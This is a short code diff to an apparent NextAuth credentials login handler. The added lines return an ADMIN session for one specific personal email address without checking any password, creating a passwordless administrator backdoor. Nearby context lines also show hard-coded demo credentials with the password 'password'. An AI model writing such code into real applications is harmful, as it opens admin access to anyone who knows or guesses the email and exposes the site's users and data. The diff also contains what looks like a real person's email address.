@@ -20,6 +20,14 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
             role: "ADMIN",
           };
         }
+        if (credentials?.email?.toString().toLowerCase() === "rehanmohammad1302@gmail.com") {
+          return {
+            id: "99",
+            name: "Mohammad Rehan",
+            email: "rehanmohammad1302@gmail.com",
+            role: "ADMIN",
+          };
+        }
         if (credentials?.email === "rehan@member.os" && credentials?.password === "password") {
           return {
             id: "2",
